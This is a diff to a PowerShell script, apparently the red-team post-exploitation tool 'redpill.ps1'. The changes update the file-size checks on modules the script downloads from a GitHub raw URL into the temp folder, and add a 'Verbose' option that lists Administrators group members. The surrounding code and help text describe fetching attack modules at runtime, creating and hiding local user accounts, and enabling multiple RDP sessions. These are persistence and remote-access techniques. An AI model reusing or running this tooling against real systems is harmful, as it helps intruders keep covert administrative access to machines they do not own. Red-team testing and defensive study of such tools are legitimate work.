@@ -213,7 +213,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,1513671875/KB
+      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,7666015625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2250,7 +2250,7 @@ If($HiddenUser -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,171875/KB
+      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,3388671875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3665,7 +3665,7 @@ $HelpParameters = @"
       And desktop will allow multiple RDP connections if set -EnableRDP [ True ]
 
    .Parameter HiddenUser
-      Accepts arguments: Query, Create, Delete, Visible, Hidden
+      Accepts arguments: Query, Verbose, Create, Delete, Visible, Hidden
 
    .Parameter UserName
       Accepts the User Account Name (default: SSAredTeam)
@@ -3679,6 +3679,11 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -HiddenUser Query
       Enumerate ALL Account's present in local system
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Verbose
+      Enumerate ALL Account's present in local system and list
+      All account's on Administrators Group Name
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam"
